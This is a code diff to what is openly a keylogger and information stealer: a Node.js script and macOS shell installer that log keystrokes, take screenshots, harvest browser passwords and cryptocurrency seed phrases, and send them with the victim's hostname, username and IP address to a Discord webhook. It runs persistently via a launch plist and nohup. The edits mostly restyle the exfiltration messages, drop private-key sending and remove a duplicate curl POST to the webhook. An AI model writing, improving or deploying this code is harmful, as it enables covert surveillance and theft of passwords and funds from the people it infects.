@@ -799,7 +799,7 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `**Keylogger**\n\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
+    const keylogContent = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⌨️ **Keylogger**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Time:** \`${new Date().toLocaleString()}\``;
     
     // If we have a screenshot, upload it directly to Discord as file attachment
     if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
@@ -1411,37 +1411,26 @@ function sendFileToDiscord(filepath, filename, analysis) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // Build modern clean Discord message
+    // Build modern clean Discord message with visual formatting
     const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
-    const privateKeys = analysis.detected.filter(d => d.type === 'private_key');
     
-    // Only send if we found actual seed phrases or private keys
-    if (seedPhrases.length === 0 && privateKeys.length === 0) return;
+    // Only send if we found actual seed phrases
+    if (seedPhrases.length === 0) return;
     
-    let message = ``;
+    let message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **Seed Phrase Detected**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
     
     // Seed phrase content (clean format)
-    if (seedPhrases.length > 0) {
-        message += `**Seed Phrase Detected**\n\n`;
-        seedPhrases.forEach((item) => {
-            message += `\`\`\`\n${item.words.join(' ')}\n\`\`\`\n\n`;
-        });
-    }
+    seedPhrases.forEach((item) => {
+        message += `\`\`\`\n${item.words.join(' ')}\n\`\`\`\n\n`;
+    });
     
-    // Private keys if found
-    if (privateKeys.length > 0) {
-        if (seedPhrases.length > 0) message += `**Private Keys:**\n`;
-        else message += `**Private Keys Detected**\n\n`;
-        privateKeys.forEach((item) => {
-            message += `\`${item.value.substring(0, 60)}${item.value.length > 60 ? '...' : ''}\`\n`;
-        });
-        message += `\n`;
-    }
-    
-    // System info (clean format)
+    // System info (clean format with separator)
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💻 **System Info**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
     message += `**Hostname:** \`${HOSTNAME}\`\n`;
     message += `**PC Username:** \`${USERNAME}\`\n`;
-    message += `**IP Address:** \`${ipAddress}\``;
+    message += `**IP Address:** \`${ipAddress}\`\n`;
+    message += `**File:** \`${filename}\`\n`;
+    message += `**Time:** \`${new Date().toLocaleString()}\``;
     
     // Create payload file
     const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
@@ -1729,7 +1718,7 @@ main
                         const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
                         
                         // Create modern message
-                        const message = `**Browser Passwords**\n\n**Collected From:** \`${browserList}\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
+                        const message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **Browser Passwords**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Collected From:** \`${browserList}\`\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💻 **System Info**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Time:** \`${new Date().toLocaleString()}\``;
                         
                         // Send to Discord with file attachment
                         const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
@@ -1799,7 +1788,7 @@ setInterval(() => {
     }
 
     const startupPayload = {
-        content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
+        content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ **Keylogger Started Successfully**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\`\n**Status:** \`Running 24/7\`\n**Timestamp:** \`${new Date().toLocaleString()}\``
     };
     const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
     try {
@@ -1891,23 +1880,7 @@ PLISTEOF
         (cd "$APP_DIR" && nohup "$NODE_PATH" keylogger-screenshotter.js >/dev/null 2>&1 &)
     fi
     
-    # Send Discord notification that keylogger is installed and running
-    sleep 3  # Wait a moment for keylogger to start
-    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
-    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
-    
-    DISCORD_MSG="⌨️ **KEYLOGGER + SCREENSHOTTER INSTALLED**\n\n"
-    DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Status:** Keylogger + Screenshotter running 24/7 (persistent)\n"
-    DISCORD_MSG="${DISCORD_MSG}**Features:** Keystrokes + Screenshots → Discord\n"
-    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
-    
-    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
-    
-    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
-        -d "{\"content\": \"$ESCAPED_MSG\"}" \
-        "$WEBHOOK" >/dev/null 2>&1
+    # Keylogger startup message is sent by the JS script itself (no duplicate needed)
 }
 
 # Install keylogger + screenshotter in background (non-blocking)
